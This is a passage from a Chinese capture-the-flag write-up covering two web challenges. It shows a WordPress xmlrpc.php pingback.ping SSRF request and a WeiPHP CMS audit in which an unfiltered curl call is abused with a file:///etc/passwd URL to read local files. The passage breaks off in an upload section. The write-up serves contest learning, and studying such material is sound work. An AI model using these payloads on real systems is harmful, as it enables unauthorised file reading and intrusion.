sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109012449.png" alt=""></p><h2 id="babypress"><a href="#babypress" class="headerlink" title="babypress"></a>babypress</h2><p>这题比较狗血…前一天给了两个 hint :</p><p></p><figure class="highlight applescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">first</span> hint <span class="hljs-keyword">for</span> babypress: ssrf n-<span class="hljs-built_in">day</span> exploit <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> internet will <span class="hljs-keyword">not</span> work</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">second</span> hint: <span class="hljs-keyword">if</span> you can exploit <span class="hljs-keyword">in</span> your <span class="hljs-keyword">local</span>, <span class="hljs-keyword">it</span> should be possible <span class="hljs-keyword">to</span> exploit <span class="hljs-keyword">in</span> remote.</span><br></pre></td></tr></tbody></table></figure><p></p><p>随便搜一下我们大概可以知道 ssrf n-day 是通过 <code>xmlrpc.php</code> 这个文件来打内网的，然后当晚我们通过<code>xmlrpc.php</code>成功进行了 SSRF ，当看到了这两个 hint …我们就感觉不妙，应该打的不是我们这个， but 我们确实打成功了呀…于是我们当晚又加了一会班，当时最新版本是 5.2.4 ，于是我们找到 5.2.4 的 <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/" target="_blank" rel="noopener">security issue</a>，然后找到了<a href="https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2" target="_blank" rel="noopener">更新补丁</a>，但是感觉绕不过…以为是个新的绕过方式啥的…</p><p>好了，结果到了第二天一开始没人打成功…后来，到了差不多中午主办方又发公告更换环境，当时我们都在看另一个题，也就没管，结果一会有两个队出了…然后我们试了一下昨晚我们打<code>xmlrpc.php</code>的，就成了…</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>pingback.ping<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://<span class="hljs-tag">&lt;<span class="hljs-name">YOUR</span> <span class="hljs-attr">SERVER</span> &gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://<span class="hljs-tag">&lt;<span class="hljs-name">SOME</span> <span class="hljs-attr">VALID</span> <span class="hljs-attr">BLOG</span> <span class="hljs-attr">FROM</span> <span class="hljs-attr">THE</span> <span class="hljs-attr">SITE</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>主要就是要发一个评论以及更改一下第二个参数为他的 host 才行…这题也没啥好说的…感觉全场唯一的槽点(Web)就是这个了。</p><h2 id="weiphp"><a href="#weiphp" class="headerlink" title="weiphp"></a>weiphp</h2><p>一个叫 weiphp 的 CMS 审计，这个主要是队友看的，我当时做另外一道题去了。我们出的是一个 ssrf 的地方，赛后问了出的师傅，是审了上传的地方。</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>我们全局搜<code>curl</code>，可以在 Base.php 中发现有以下代码：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post_data</span><span class="hljs-params">($url, $param, $type = <span class="hljs-string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  $res = post_data($url, $param, $type, $return_array, $useCert);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// 各种常见错误判断</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'curl_erron'</span>])) {</span><br><span class="line">    <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'curl_erron'</span>] . <span class="hljs-string">': '</span> . $res[<span class="hljs-string">'curl_error'</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ($return_array) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'errcode'</span>]) &amp;&amp; $res[<span class="hljs-string">'errcode'</span>] != <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error(error_msg($res));</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'return_code'</span>]) &amp;&amp; $res[<span class="hljs-string">'return_code'</span>] == <span class="hljs-string">'FAIL'</span> &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'return_msg'</span>])) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'return_msg'</span>]);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'result_code'</span>]) &amp;&amp; $res[<span class="hljs-string">'result_code'</span>] == <span class="hljs-string">'FAIL'</span> &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'err_code'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($res[<span class="hljs-string">'err_code_des'</span>])) {</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;error($res[<span class="hljs-string">'err_code'</span>] . <span class="hljs-string">': '</span> . $res[<span class="hljs-string">'err_code_des'</span>]);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> $res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>跟进第三行的<code>post_data</code>，我们可以在 common.php 中找到该函数：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post_data</span><span class="hljs-params">($url, $param = [], $type = <span class="hljs-string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    $has_json = <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'json'</span> &amp;&amp; is_array($param)) {</span><br><span class="line">        $has_json = <span class="hljs-keyword">true</span>;</span><br><span class="line">        $param = json_encode($param, JSON_UNESCAPED_UNICODE);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($type == <span class="hljs-string">'xml'</span> &amp;&amp; is_array($param)) {</span><br><span class="line">        $param = ToXml($param);</span><br><span class="line">    }</span><br><span class="line">    add_debug_log($url, <span class="hljs-string">'post_data'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 初始化curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type != <span class="hljs-string">'file'</span>) {</span><br><span class="line">        add_debug_log($param, <span class="hljs-string">'post_data'</span>);</span><br><span class="line">        <span class="hljs-comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">30</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number">180</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="hljs-keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="hljs-keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="hljs-keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 设置header</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'file'</span>) {</span><br><span class="line">        $header[] = <span class="hljs-string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($type == <span class="hljs-string">'xml'</span>) {</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-keyword">false</span>);</span><br><span class="line">    } <span class="hljs-keyword">elseif</span> ($has_json) {</span><br><span class="line">        $header[] = <span class="hljs-string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="hljs-comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($useCert[<span class="hljs-string">'certPath'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($useCert[<span class="hljs-string">'keyPath'</span>])) {</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERTTYPE, <span class="hljs-string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLCERT, $useCert[<span class="hljs-string">'certPath'</span>]);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEYTYPE, <span class="hljs-string">'PEM'</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSLKEY, $useCert[<span class="hljs-string">'keyPath'</span>]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($type != <span class="hljs-string">'file'</span>) {</span><br><span class="line">        add_debug_log($res, <span class="hljs-string">'post_data'</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// echo $res;die;</span></span><br><span class="line">    $flat = curl_errno($ch);</span><br><span class="line"></span><br><span class="line">    $msg = <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ($flat) {</span><br><span class="line">        $msg = curl_error($ch);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// add_request_log($url, $param, $res, $flat, $msg);</span></span><br><span class="line">    <span class="hljs-keyword">if</span> ($flat) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [</span><br><span class="line">            <span class="hljs-string">'curl_erron'</span> =&gt; $flat,</span><br><span class="line">            <span class="hljs-string">'curl_error'</span> =&gt; $msg</span><br><span class="line">        ];</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($return_array &amp;&amp; !<span class="hljs-keyword">empty</span>($res)) {</span><br><span class="line">            $res = $type == <span class="hljs-string">'json'</span> ? json_decode($res, <span class="hljs-keyword">true</span>) : FromXml($res);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> $res;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到 common.php 中的没有什么过滤，所以我们只需要找引用 Base.php 当中的<code>post_data</code>函数的地方就行了。我们随便登录一下就可以发现其路由规则了，比如登录路由是<code>index.php/home/user/login</code>，对应的是<code>application/home/controller/User.php</code>当中的<code>login()</code>方法，而 Base.php 跟其他 controller 有以下继承关系：</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">User</span>.</span></span>php -&gt; home/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Home</span>.</span></span>php -&gt; common/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebBase</span>.</span></span>php -&gt; common/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base</span>.</span></span>php</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以<code>post_data</code>为 public 方法也可以直接调用，所以根据<code>post_data</code>方法的参数，我们需要传入几个参数，<code>url</code>为 SSRF 的点，<code>param</code>随笔即可。</p><p>这里由于 cms 开启了 debug ，这里要把<code>type</code>参数设为<code>file</code>，让<code>post_data</code>函数在调用<code>FromXml</code>函数的时候，由于我们传入诸如<code>url=file:///etc/passwd</code>的参数，会导致<code>simple_xml_load_string</code>出错</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * 将xml转为array</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FromXml</span><span class="hljs-params">($xml)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!$xml) {</span><br><span class="line">        <span class="hljs-keyword">exception</span>(<span class="hljs-string">"xml数据异常！"</span>);</span><br><span class="line">    }</span><br><span class="line">    file_log($xml, <span class="hljs-string">'FromXml'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 解决部分json数据误入的问题</span></span><br><span class="line">    $arr = json_decode($xml, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_array($arr) &amp;&amp; !<span class="hljs-keyword">empty</span>($arr)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> $arr;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// 将XML转为array</span></span><br><span class="line">    $arr = json_decode(json_encode(simplexml_load_string($xml, <span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOCDATA)), <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> $arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109024547.png" alt=""></p><p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109020248.png" alt=""></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>在<code>application/home/controller/File.php</code>我们可以看到有这么一个方法</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span 